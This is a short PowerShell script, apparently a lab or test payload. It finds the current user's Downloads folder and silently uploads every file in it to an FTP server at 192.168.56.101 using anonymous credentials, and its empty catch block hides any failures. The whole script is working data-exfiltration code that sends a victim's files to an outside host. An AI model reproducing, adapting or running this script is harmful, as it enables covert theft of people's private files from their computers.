$ftpServer = "ftp://192.168.56.101"
$username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
$localFolder = "C:\Users\$username\Downloads"
$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("anonymous", "anonymous")

$files = Get-ChildItem -Path $localFolder

foreach ($file in $files) {
    $ftpFilePath = "$ftpServer/uploads/$($file.Name)"
    
    try {
        $localFilePathWithUser = "$localFolder\$($file.Name)"
        $client.UploadFile($ftpFilePath, "STOR", $localFilePathWithUser)
    } catch {
        #test
    }
}